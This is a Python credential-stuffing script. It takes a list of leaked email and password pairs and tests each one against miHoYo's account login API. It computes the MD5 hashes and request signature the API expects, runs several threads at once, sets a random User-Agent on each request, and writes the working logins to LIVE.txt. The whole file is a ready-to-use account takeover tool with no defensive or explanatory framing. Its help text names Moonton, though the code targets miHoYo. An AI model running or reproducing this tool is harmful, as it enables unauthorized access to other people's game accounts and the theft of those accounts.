#!/usr/bin/env python
# Created By mybed

import requests, hashlib, json, warnings, argparse
from termcolor import colored
from fake_useragent import UserAgent
from concurrent.futures import ThreadPoolExecutor
from requests.packages.urllib3.exceptions import InsecureRequestWarning
warnings.simplefilter('ignore', InsecureRequestWarning)

def doSave(filename, content):
    f = open(filename, 'a+')
    f.write(content + "\n")
    f.close()

def doDictSorting(dicts):
    result = ''
    for i in dicts.keys():
        result += i + '=' + dicts[i] + "&"
    return result

def doCheck(empass, delim = None):
    if delim is not None:
        delim = delim
    else:
        delim = "|"
    try:
        email, password = empass.split(delim, 2)
        wibuPost = {
            'op': 'login',
            'sign': '',
            'params': {
                'account': email,
                'md5pwd': hashlib.md5(str(password).encode('utf-8')).hexdigest()
            },
            'lang': 'en'
        }
        wibuSort = doDictSorting(wibuPost['params'])
        wibuSort += 'op=' + wibuPost['op']
        wibuPost['sign'] = hashlib.md5(str(wibuSort).encode('utf-8')).hexdigest()
        getData = requests.post('https://webapi-os.account.mihoyo.com/Api/login_by_password/', data=json.dumps(wibuPost), headers={'User-Agent': UserAgent().random})
        wibuJson = json.loads(getData.text)
        if wibuJson['message'] == 'Success':
            print(colored('LIVE!', 'green') + " " + empass + " " + colored('Login Success!', 'blue'))
            doSave('LIVE.txt', empass)
        elif wibuJson['message'] == 'Account or password error':
            print(colored('WRONG PASSWORD!', 'blue') + " " + email + " " + colored('Wrong Password!', 'red'))
            doSave('DIE.txt', email)
        elif wibuJson['message'] == 'Email not yet registered':
            print(colored('WRONG!', 'red') + " " + empass + " " + colored('Email Account Not Found!', 'yellow'))
            doSave('WRONG.txt', empass)
        else:
            print(colored('UNCHECK!', 'yellow') + " " + empass)
            doSave('MOONTON_UNCHECK.txt', empass)
    except Exception as e:
        print('OOPS! ' + str(e))

parser = argparse.ArgumentParser(description='MOONTON ACCOUNT CHECKER & VALID CHECKER BY WIBUHEKER!')
parser.add_argument('--list', help='List of ur mail|password', required=True)
parser.add_argument('--thread', help='Threading Proccess for fast checking max 10')
parser.add_argument('--delim', help='Delimeter ex | or : or =')
wibuheker = parser.parse_args()    
try:
    wibuList = open(wibuheker.list, 'r').read().splitlines()
    if wibuheker.thread and wibuheker.thread is not None:
        with ThreadPoolExecutor(max_workers=int(wibuheker.thread)) as execute:
            for empass in wibuList:
                execute.submit(doCheck, empass, wibuheker.delim)
    else:
        for empass in wibuList:
            doCheck(empass, wibuheker.delim)
except Exception as e:
    print('OOPS! ' + str(e))